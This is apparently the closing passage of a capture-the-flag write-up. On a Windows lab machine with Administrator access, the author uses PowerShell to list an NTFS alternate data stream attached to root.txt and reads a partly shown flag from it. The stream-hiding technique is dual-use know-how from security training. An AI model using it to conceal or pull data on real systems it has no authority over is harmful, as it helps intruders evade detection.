An easy way to "hide" data in CTF challenges on NTFS file systems is to use alternate data streams. Using powershell, I was able to determine that a `flag.txt` stream is present.

```
PS C:\Users\Administrator\Desktop> get-item -force -path root.txt -stream *

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\root.txt::$DATA
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop
PSChildName   : root.txt::$DATA
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\Users\Administrator\Desktop\root.txt
Stream        : :$DATA
Length        : 1958

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\root.txt:flag.txt
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop
PSChildName   : root.txt:flag.txt
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\Users\Administrator\Desktop\root.txt
Stream        : flag.txt
Length        : 35
```

```
PS C:\Users\Administrator\Desktop> get-content -force -path root.txt -stream flag.txt
6d29b0...
```

Game over, finally!